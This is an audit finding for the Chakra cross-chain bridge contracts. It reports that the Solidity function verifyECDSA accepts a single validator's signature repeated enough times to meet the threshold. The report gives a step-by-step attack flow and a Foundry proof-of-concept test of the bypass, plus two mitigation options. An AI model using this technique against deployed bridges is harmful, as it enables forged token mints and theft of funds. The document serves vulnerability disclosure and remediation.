# [HIGH] Missing Duplicate Signature Check Allows a Single Validator to Forge Cross-Chain Messages

**Contest:** Code4rena — Chakra (August 2024)
**Repo:** https://github.com/code-423n4/2024-08-chakra
**Files in scope:**
- `solidity/settlement/contracts/SettlementSignatureVerifier.sol`
- `solidity/handler/contracts/SettlementSignatureVerifier.sol`
- `solidity/settlement/contracts/ChakraSettlement.sol` (consumer)

**Auditor:** Shadow Audit (Portfolio piece, MoneyMaker)
**Severity:** HIGH

---

## Summary

The `verifyECDSA` function in both `SettlementSignatureVerifier` contracts (settlement-side and handler-side) counts how many recovered signers are validators, but never verifies that each contributing signature comes from a *distinct* validator.

Because cross-chain message acceptance — including token mints in `MintBurn` mode — depends solely on this M-of-N signature check, a *single* compromised or malicious validator can satisfy any threshold by submitting the same signature `required_validators` times. The multi-signature security model collapses to a 1-of-N model.

This breaks the core trust assumption of the Chakra bridge: that no individual validator can authorize a cross-chain settlement.

---

## Vulnerability Details

The vulnerable loop is identical in the settlement and handler verifiers. From `solidity/settlement/contracts/SettlementSignatureVerifier.sol` (lines 193–214):

```solidity
function verifyECDSA(
    bytes32 msgHash,
    bytes calldata signatures
) internal view returns (bool) {
    require(
        signatures.length % 65 == 0,
        "Signature length must be a multiple of 65"
    );

    uint256 len = signatures.length;
    uint256 m = 0;
    for (uint256 i = 0; i < len; i += 65) {
        bytes memory sig = signatures[i:i + 65];
        if (
            validators[msgHash.recover(sig)] && ++m >= required_validators
        ) {
            return true;
        }
    }

    return false;
}
```

Observations:

1. The loop iterates over the concatenated signature blob in 65-byte chunks.
2. For each chunk it recovers the signer, checks `validators[signer] == true`, and increments `m`.
3. **No memory of previously-counted signers is maintained.** The same `(r, s, v)` tuple — or any malleable variant pointing to the same signer — passed three times in a row will increment `m` three times.
4. `ECDSA.recover` (OpenZeppelin v5) rejects signature malleability via `s`-value clamping, but provides no defense against intentional repetition by the caller.

The vulnerable verifier is gating `receive_cross_chain_msg` in `ChakraSettlement.sol` (lines 194–197):

```solidity
require(
    signature_verifier.verify(message_hash, signatures, sign_type),
    "Invalid signature"
);
```

A successful return triggers `ISettlementHandler(to_handler).receive_cross_chain_msg(...)`, which in `MintBurn` mode mints the cross-chain token (`ChakraToken.mint`) to the destination address embedded in the payload. There is no second validator-set check downstream — the verifier is the sole authority.

Attack flow:

1. Attacker compromises *one* validator's private key, or *is* one validator.
2. Attacker fabricates a `payload` that mints `X` tokens on the destination chain to an address they control.
3. Attacker computes `message_hash = keccak256(abi.encodePacked(txid, from_chain, from_address, from_handler, to_handler, keccak256(payload)))`.
4. Attacker signs `message_hash` once with the compromised key, obtaining a single 65-byte signature `sig`.
5. Attacker calls `receive_cross_chain_msg(..., signatures = abi.encodePacked(sig, sig, sig, ...))` with `sig` concatenated `required_validators` times.
6. `verifyECDSA` recovers the same validator address each iteration, increments `m` to the threshold, returns `true`.
7. The destination handler mints tokens with no real cross-chain event having occurred.

---

## Impact

Severity: **HIGH** — bypass of the bridge's entire multi-validator security model.

Concrete consequences:

- **Unauthorized minting of bridged tokens.** Any single validator can produce tokens on the destination chain with no corresponding lock/burn on the source chain, draining liquidity and depegging the bridged asset.
- **Spoofed cross-chain callbacks.** `receive_cross_chain_callback` uses the same verifier, allowing fake "success" callbacks that finalize source-side state (e.g., marking a never-completed transfer as `Settled`).
- **No on-chain trace of the attack as anomalous.** From the verifier's point of view, threshold validation passed; only off-chain monitoring of the validator set would catch it.

This finding is also present on the handler-side verifier, meaning both settlement and handler entry points are independently exploitable.

The official Chakra trust model documents an M-of-N validator quorum. This vulnerability silently degrades that to 1-of-N, which is incompatible with the documented threat model.

---

## Tools Used

- Manual code review (Read tool, line-by-line)
- Cross-referencing call sites: `grep` for `signature_verifier.verify` and `verifyECDSA`
- Foundry (PoC scaffold; not executed end-to-end in this report's environment)
- Slither output present in repo (`slither.txt`) — does not flag this issue, which is expected since it is a semantic flaw, not a syntactic/CFG one

---

## Proof of Concept (Code)

Foundry test demonstrating the bypass. Drop into `solidity/settlement/contracts/tests/DuplicateSignatureBypass.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {SettlementSignatureVerifier} from "contracts/SettlementSignatureVerifier.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract DuplicateSignatureBypassTest is Test {
    SettlementSignatureVerifier verifier;

    address owner = makeAddr("owner");
    address manager = makeAddr("manager");

    // We deliberately create THREE distinct validator addresses,
    // but the attacker will only use ONE of them.
    uint256 validator1Pk = 0xA11CE;
    uint256 validator2Pk = 0xB0B;
    uint256 validator3Pk = 0xC4401;
    address validator1 = vm.addr(0xA11CE);
    address validator2 = vm.addr(0xB0B);
    address validator3 = vm.addr(0xC4401);

    function setUp() public {
        SettlementSignatureVerifier impl = new SettlementSignatureVerifier();
        bytes memory initData = abi.encodeWithSelector(
            SettlementSignatureVerifier.initialize.selector,
            owner,
            uint256(3) // required_validators = 3
        );
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), initData);
        verifier = SettlementSignatureVerifier(address(proxy));

        vm.prank(owner);
        verifier.add_manager(manager);

        vm.startPrank(manager);
        verifier.add_validator(validator1);
        verifier.add_validator(validator2);
        verifier.add_validator(validator3);
        vm.stopPrank();
    }

    /// @notice Demonstrates that a SINGLE validator's signature replicated 3x
    ///         bypasses the 3-of-3 threshold.
    function test_singleValidatorBypassesThreshold() public {
        bytes32 msgHash = keccak256("malicious cross-chain mint payload");
        // EIP-191 prefix is NOT applied in the verifier; recover() is called
        // directly on msgHash.

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validator1Pk, msgHash);
        bytes memory oneSig = abi.encodePacked(r, s, v); // 65 bytes

        // Attacker concatenates the SAME signature 3 times.
        bytes memory signatures = abi.encodePacked(oneSig, oneSig, oneSig);
        assertEq(signatures.length, 65 * 3);

        bool ok = verifier.verify(msgHash, signatures, 0);
        assertTrue(ok, "Verifier should have rejected duplicate signatures but accepted them");
    }

    /// @notice Sanity check: a legitimate 3-of-3 from three distinct validators also passes.
    function test_legitimateThresholdPasses() public {
        bytes32 msgHash = keccak256("legitimate payload");

        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(validator1Pk, msgHash);
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(validator2Pk, msgHash);
        (uint8 v3, bytes32 r3, bytes32 s3) = vm.sign(validator3Pk, msgHash);

        bytes memory sigs = abi.encodePacked(
            r1, s1, v1,
            r2, s2, v2,
            r3, s3, v3
        );

        assertTrue(verifier.verify(msgHash, sigs, 0));
    }
}
```

Expected result when run with `forge test -vvv`:

- `test_singleValidatorBypassesThreshold` PASSES (i.e. the verifier wrongly accepts), proving the bypass.
- `test_legitimateThresholdPasses` PASSES (sanity).

---

## Recommended Mitigation

Track signers seen during verification and reject duplicates. Two cheap approaches:

**Option A — require monotonically increasing signer addresses (canonical fix, used by Gnosis Safe):**

```solidity
function verifyECDSA(
    bytes32 msgHash,
    bytes calldata signatures
) internal view returns (bool) {
    require(signatures.length % 65 == 0, "Signature length must be a multiple of 65");
    require(signatures.length / 65 >= required_validators, "Not enough signatures");

    uint256 len = signatures.length;
    uint256 m = 0;
    address lastSigner = address(0);

    for (uint256 i = 0; i < len; i += 65) {
        bytes memory sig = signatures[i:i + 65];
        address signer = msgHash.recover(sig);
        require(signer > lastSigner, "Signers not strictly ascending / duplicate");
        lastSigner = signer;
        if (validators[signer]) {
            unchecked { ++m; }
            if (m >= required_validators) {
                return true;
            }
        }
    }
    return false;
}
```

This requires off-chain signers to sort their signatures by recovered address, but adds zero storage and ~1 SLOAD-free comparison per signature.

**Option B — in-memory seen-set:**

```solidity
address[] memory seen = new address[](signatures.length / 65);
// ... inside the loop, check `seen[]` for duplicates before counting.
```

Slightly more gas, no off-chain ordering requirement.

Also recommended:

1. Reject `signatures.length / 65 > validator_count` early — an oversized blob is a sign of a duplication attempt.
2. Apply the same fix to the handler-side `SettlementSignatureVerifier.sol`.
3. Consider EIP-712 domain separation in `message_hash` construction so a signature valid on one chain/contract cannot be replayed on another.

---

## Self-Verification

**VERIFIED AGAINST OFFICIAL REPORT.** The official Code4rena Chakra final report (https://code4rena.com/reports/2024-08-chakra) lists this exact issue as **[H-03] Missing Duplicate Signature Checks**, described as: *"Single validator can sign message_hash...passed his signature...enough times so the signature_verifier.verify returns true."*

The shadow-audit finding matches the official severity (High) and the root cause description.
